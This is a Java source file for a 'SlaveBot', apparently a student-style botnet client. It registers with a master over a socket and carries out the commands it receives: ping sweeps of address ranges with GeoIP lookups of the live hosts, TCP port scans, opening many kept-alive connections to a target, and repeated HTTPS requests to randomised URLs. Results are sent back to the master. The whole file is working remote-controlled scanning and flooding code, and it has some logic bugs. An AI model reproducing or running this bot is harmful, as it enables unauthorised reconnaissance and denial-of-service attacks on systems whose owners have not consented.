import java.net.*;
import java.io.*;
import java.util.*;
import java.text.*;
import com.maxmind.geoip.Location;
import com.maxmind.geoip.LookupService;
import com.maxmind.geoip.regionName;

class ServerLocation {

	private String countryCode;
	private String countryName;
	private String region;
	private String regionName;
	private String city;
	private String postalCode;
	private String latitude;
	private String longitude;

	@Override
	public String toString() {
		return city + " " + postalCode + ", " + regionName + " (" + region
				+ "), " + countryName + " (" + countryCode + ") " + latitude
				+ "," + longitude;
	}

	public String getCity() {
		return city;
	}

	public void setCity(String city) {
		this.city = city;
	}

	public String getCountryCode() {
		return countryCode;
	}

	public void setCountryCode(String countryCode) {
		this.countryCode = countryCode;
	}

	public String getCountryName() {
		return countryName;
	}

	public void setCountryName(String countryName) {
		this.countryName = countryName;
	}

	public String getLatitude() {
		return latitude;
	}

	public void setLatitude(String latitude) {
		this.latitude = latitude;
	}

	public String getLongitude() {
		return longitude;
	}

	public void setLongitude(String longitude) {
		this.longitude = longitude;
	}

	public String getPostalCode() {
		return postalCode;
	}

	public void setPostalCode(String postalCode) {
		this.postalCode = postalCode;
	}

	public String getRegion() {
		return region;
	}

	public void setRegion(String region) {
		this.region = region;
	}

	public String getRegionName() {
		return regionName;
	}

	public void setRegionName(String regionName) {
		this.regionName = regionName;
	}
}



public class SlaveBot {
	private static Socket so[] = null;
	public static Socket sc = null;
	private static int a=0;
	private static String opappend = " ";
	private static String opappend1 = " ";
	private static String rtninfo ="";
	//private static String x=" ";
	//private static List<String> IPaddresses = new ArrayList<>();
	private static String IPaddresses = " ";
	private static String IPaddresses1 = " ";
	private static int z1 = 0;

	private static boolean portIsOpen(String ip, int port, int timeout)
	{
        try {
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(ip, port), timeout);
            socket.close();
            return true;
        }
	catch (Exception ex) {
            return false;
        }
    }//function
//public static List<String> runSystemCommand(String internetProtocolAddress) {
public static String runSystemCommand(String internetProtocolAddress) {

    try {
	//List<String> command = new ArrayList<>();
	String command="";
        command = command + "ping ";

        if (System.getProperty("os.name").equals("Linux"))
        {
	command = command + "-c ";
          //  command.add("-n");
        }
        else
        {
          command = command + "-n ";
        }
        

        command = command + "1 ";
        command = command + internetProtocolAddress;

        //System.out.println("command "+command);
        Process p = Runtime.getRuntime().exec(command);
        BufferedReader inputStream = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
	//System.out.println(inputStream.readLine());
        String s = "";
        // reading output stream of the command
        while ((s = inputStream.readLine()) != null) {
            //System.out.println(s);
	opappend=opappend+s;
        }
	//System.out.println(" " +opappend);
	if(opappend.contains("0 received")||opappend.contains("unreachable"))
	{
	System.out.println(" " +internetProtocolAddress +" not reachable ");
	opappend=" ";
	return IPaddresses;
	}
	else if(opappend.contains("1 received")|| opappend.contains("Received = 1"))
	{
	System.out.println(" " +internetProtocolAddress +" reachable ");
	opappend=" ";
	IPaddresses = IPaddresses + internetProtocolAddress + ",";
	return IPaddresses;
	}

	//System.out.println("IP - " +IPaddresses);
	//if (s.contains("0 received"))
	//System.out.println(false);
	return IPaddresses;
    } catch (Exception e) {
        e.printStackTrace();
    }
	return IPaddresses;
}
public static String geoget(String internetProtocolAddress) {
try{
	SlaveBot obj = new SlaveBot();
	ServerLocation location = obj.getLocation(internetProtocolAddress);
	String location1 = location.toString();
	return location1;
	}
	catch (Exception e) {
		String notinDB="Ip not in data base";
	return notinDB;
	}

  }

  public static ServerLocation getLocation(String ipAddress) {

	File file = new File("GeoLiteCity.dat");
	return getLocation(ipAddress, file);

  }

  public static ServerLocation getLocation(String ipAddress, File file) {

	ServerLocation serverLocation = null;

	try {

	serverLocation = new ServerLocation();

	LookupService lookup = new LookupService(file,LookupService.GEOIP_MEMORY_CACHE);
	Location locationServices = lookup.getLocation(ipAddress);

	serverLocation.setCountryCode(locationServices.countryCode);
	serverLocation.setCountryName(locationServices.countryName);
	serverLocation.setRegion(locationServices.region);
	serverLocation.setRegionName(regionName.regionNameByCode(
             locationServices.countryCode, locationServices.region));
	serverLocation.setCity(locationServices.city);
	serverLocation.setPostalCode(locationServices.postalCode);
	serverLocation.setLatitude(String.valueOf(locationServices.latitude));
	serverLocation.setLongitude(String.valueOf(locationServices.longitude));

	} catch (IOException e) {
		System.err.println(e.getMessage());
	}

	return serverLocation;

  }



public static String runSystemCommand1(String internetProtocolAddress) {

    try {
	//List<String> command = new ArrayList<>();
	String command="";
        command = command + "ping ";

        if (System.getProperty("os.name").equals("Linux"))
        {
	command = command + "-c ";
          //  command.add("-n");
        }
        else
        {
          command = command + "-n ";
        }
        

        command = command + "1 ";
        command = command + internetProtocolAddress;

        //System.out.println("command "+command);
        Process p = Runtime.getRuntime().exec(command);
        BufferedReader inputStream = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
	//System.out.println(inputStream.readLine());
        String s = "";
        // reading output stream of the command
        while ((s = inputStream.readLine()) != null) {
            //System.out.println(s);
	opappend1=opappend1+s;
        }
	//System.out.println(" " +opappend);
	if(opappend1.contains("0 received")||opappend1.contains("unreachable"))
	{
	System.out.println(" " +internetProtocolAddress +" not reachable ");
	opappend1=" ";
	return IPaddresses1;
	}
	else if(opappend1.contains("1 received")|| opappend1.contains("Received = 1"))
	{
	System.out.println(" " +internetProtocolAddress +" reachable ");
	opappend1=" ";
	
	rtninfo = geoget(internetProtocolAddress);
	IPaddresses1 = IPaddresses1 + internetProtocolAddress  + " " + rtninfo + "split";
	
	return IPaddresses1;
	
	}

	
	return IPaddresses1;
	
    } catch (Exception e) {
        e.printStackTrace();
    }

	return IPaddresses1;
	
}









		public static void main(String arg[])
	{
		try{
		if (!arg[0].equals("h") || !arg[2].equals("p") || arg.length != 4)
		System.out.println("invalid need h ipaddress p portnumber");
		int PORT = Integer.parseInt(arg[3]);

		
		
		//ServerSocket SS = new ServerSocket(PORT);
		InetAddress IP=InetAddress.getLocalHost();
		sc= new Socket(IP,Integer.parseInt(arg[3]));
		String hostname = IP.getHostName();
		DateFormat df= new SimpleDateFormat("YYYY-MM-dd");
		Date d = new Date();
		String ips = hostname + " " + IP.getHostAddress() + " " + Integer.toString(PORT) + " " + df.format(d);
		DataOutputStream p=new DataOutputStream(sc.getOutputStream());
		p.writeUTF(ips);



		

	

		while(true){
		
		//Socket ss= SS.accept();
		
		DataInputStream din=new DataInputStream(sc.getInputStream());
		String M=din.readUTF();
		String msg[] = M.split(" ");
		
		
		
		int connectn=0;

		

	if(msg[0].equals("ipscan"))
{	
	//String ip = msg[2];
	SlaveBot SB1 = new SlaveBot();
		Runnable o1=SB1.new thread1(M);
		Thread t1=new Thread(o1);
		t1.start();
	
}//ifipscan
	if(msg[0].equals("geoipscan"))
{	
	//String ip = msg[2];
	SlaveBot SB3 = new SlaveBot();
		Runnable o3=SB3.new thread3(M);
		Thread t3=new Thread(o3);
		t3.start();
	
}//ifgeoipscan	
		
		else if(msg[0].equals("tcpportscan"))
{
		SlaveBot SB2 = new SlaveBot();
		Runnable o2=SB2.new thread2(M);
		Thread t2=new Thread(o2);
		t2.start();
}//tcpscan
		
		
		else if(msg[0].equals("connect")){
		int portt=Integer.parseInt(msg[3]);

		if(msg.length==4) // when no. of connections not specified
		{a = 1;connectn=a;
		so=new Socket[a];
		for(int i=0;i<a;i++)
		{so[i] = new Socket(msg[2],portt);}
		System.out.println("Connected to " + msg[2] + " on port " + portt + " and connections = " + connectn);
		}//iflen4


		else if(msg.length==5 && msg[4].contains("keepalive"))
		{a = 1;connectn=a;
		so=new Socket[a];
		for(int i=0;i<a;i++)
		 {so[i] = new Socket(msg[2],portt);so[i].setKeepAlive(true);}
		System.out.println("Connected to " + msg[2] + " on port " + portt + " and connections = " + connectn + " and are kept alive ");
		}//ifkeep
		

		else if(msg.length==6 && msg[5].contains("keepalive"))
		{connectn=Integer.parseInt(msg[4]); a = connectn;
		so=new Socket[a];
		for(int i=0;i<a;i++)
		{so[i] = new Socket(msg[2],portt);so[i].setKeepAlive(true);}
		System.out.println("Connected to " + msg[2] + " on port " + portt + " and connections = " + connectn +" and are kept alive ");
		}//elseifkeep



		else if(msg.length==5 && msg[4].contains("url"))
		{
		String ar="abcdefghijklmnopqrstuvwxyz";
		StringBuilder string=new StringBuilder();
		Random random = new Random();
		//char randomstring=' ';
		for(int i=0;i<10;i++)
		{
		string.append(ar.charAt(random.nextInt(ar.length())));
		}
		String randomstring = string.toString();
		String urlpath="https://" + msg[2] + msg[4].substring(4,msg[4].length()) + randomstring;
		URL url = new URL(urlpath);
		URLConnection connection = url.openConnection();
		BufferedReader buf = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		String src;String x=" ";
		while((src=buf.readLine())!=null)
		{
		x += src;
		}//while
		System.out.println("Connected to "+urlpath +" connections = 1");
		System.out.println(x.substring(0,250));
		System.out.println(" cleaning up the rest ");
		p.close();
		}//elseif

		
		else if(msg.length==6 && msg[5].contains("url"))
		{
		String ar="abcdefghijklmnopqrstuvwxyz";
		StringBuilder string=new StringBuilder();
		Random random = new Random();
		for(int i=0;i<10;i++)
		{
		string.append(ar.charAt(random.nextInt(ar.length())));
		}
		String randomstring = string.toString();
		String urlpath="https://" + msg[2] + msg[5].substring(4,msg[5].length()) + randomstring;
		for(int i=0;i<Integer.parseInt(msg[4]);i++){
		URL url = new URL(urlpath);
		URLConnection connection = url.openConnection();
		BufferedReader buf = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		String src;String x=" ";
		while((src=buf.readLine())!=null)
		{
		x += src;
		}//while
		System.out.println("Connected to "+urlpath+ " connections= " +msg[4]);
		System.out.println(x.substring(0,250));
		System.out.println(" cleaning up the rest ");
		}//for url
		p.close();
		}//elseif		









		else{connectn=Integer.parseInt(msg[4]); a = connectn;
		so=new Socket[a];
		for(int i=0;i<a;i++){
		so[i] = new Socket(msg[2],portt);}
		System.out.println("Connected to " + msg[2] + " on port " + portt + " and connections = " + connectn);
		}
		
		
		}//if(connect)
		
		else if(msg[0].equals("disconnect"))
		{
		//System.out.println("a= " +a);
		for(int i=0;i<a;i++)
		{so[i].close();}// closing socket
		for(int i=0;i<a;i++)	
		{
		if(so[i].isClosed())
		{
		System.out.println(" disconnected " +(i+1) + " connection");		
		}//if
		}//for	

		}
		
		

		}//while
		
		//}//else
		}//try
		catch(Exception e){
			System.out.println(e);
		}//catch
	}//main


class thread1 implements Runnable{
String M;
thread1(String M)
{this.M=M;
}
public void run( ){
		try{
String msg[] = M.split(" ");
if(msg[0].equals("ipscan"))
{			
String msg3split[] = msg[2].split("-");

	InetAddress address1 = InetAddress.getByName(msg3split[0]);

	String addrange1 = address1.toString();
	String splitaddrange1[] = addrange1.split("/");
	String iprange1=splitaddrange1[1];
	String t[] = 	iprange1.split("\\.");
	String appended = " ";
	
	if(msg3split.length==2){
InetAddress address2 = InetAddress.getByName(msg3split[1]);
	String addrange2 = address2.toString();
	String splitaddrange2[] = addrange2.split("/");
	String iprange2=splitaddrange2[1];
	String u[] = 	iprange2.split("\\.");

	int range1 = Integer.parseInt(t[3]);
	int range2 = Integer.parseInt(u[3]);
	
	for(int i=range1;i<range2+1;i++)
	{
	appended = runSystemCommand(t[0]+"."+t[1]+"."+t[2]+"."+Integer.toString(i));
	}
	
	}//if msgln=3
	else if(msg3split.length==1)
	{appended = runSystemCommand(t[0]+"."+t[1]+"."+t[2]+"."+t[3]);}
	System.out.println("addresses that responded to ICMP echo are " +appended);
	DataOutputStream connectdetails=new DataOutputStream(sc.getOutputStream());//sending the details of target to master
		connectdetails.writeUTF(appended);
	IPaddresses1=" ";opappend1=" ";
	}//ifipscan
				
	}//try
	catch (Exception e){System.out.println(e);}//catch
	}//run
}//thread1

class thread3 implements Runnable{
String M;
thread3(String M)
{this.M=M;
}
public void run( ){
		try{
String msg[] = M.split(" ");
if(msg[0].equals("geoipscan"))
{			
String msg3split[] = msg[2].split("-");

	InetAddress address1 = InetAddress.getByName(msg3split[0]);

	String addrange1 = address1.toString();
	String splitaddrange1[] = addrange1.split("/");
	String iprange1=splitaddrange1[1];
	String t[] = 	iprange1.split("\\.");
	String appended1 = " ";
	
	if(msg3split.length==2){
InetAddress address2 = InetAddress.getByName(msg3split[1]);
	String addrange2 = address2.toString();
	String splitaddrange2[] = addrange2.split("/");
	String iprange2=splitaddrange2[1];
	String u[] = 	iprange2.split("\\.");

	int range1 = Integer.parseInt(t[3]);
	int range2 = Integer.parseInt(u[3]);
	
	for(int i=range1;i<range2+1;i++)
	{
	appended1 = runSystemCommand1(t[0]+"."+t[1]+"."+t[2]+"."+Integer.toString(i));
	}
	
	}//if msgln=3
	else if(msg3split.length==1)
	{appended1 = runSystemCommand1(t[0]+"."+t[1]+"."+t[2]+"."+t[3]);}
	System.out.println("addresses that responded to gICMP echo are " +appended1);
	DataOutputStream connectdetails1=new DataOutputStream(sc.getOutputStream());//sending the details of target to master
		connectdetails1.writeUTF(appended1);
	IPaddresses1=" ";opappend1=" ";rtninfo=" ";
	}//ifgeoipscan
				
	}//try
	catch (Exception e){System.out.println(e);}//catch
	}//run
}//thread3

class thread2 implements Runnable{
String M;
thread2(String M)
{this.M=M;
}
public void run( ){
		try{
String msg[] = M.split(" ");

	if(msg[0].equals("tcpportscan"))
	{

String msg3split[] = msg[3].split("-");
int startiprange = Integer.parseInt(msg3split[0]);
	int endiprange = Integer.parseInt(msg3split[1]);
	String opnports = " ";
	String clsdports = " ";
 for(z1=startiprange;z1<(endiprange+1);z1++)
 {
	if(portIsOpen(msg[2],z1,200))
	{
	opnports = opnports + z1 + ",";}
	else
	{
	clsdports = clsdports + z1 + ",";
	}
}
	System.out.println("closed ports are" + clsdports);
	System.out.println("open ports are" + opnports);
	DataOutputStream connectdetails=new DataOutputStream(sc.getOutputStream());//sending the details of target to Master
		connectdetails.writeUTF(opnports);

	}//elseiftcp			
	}//try
	catch (Exception e){System.out.println(e);}//catch
	}//run
}//thread2


}//class


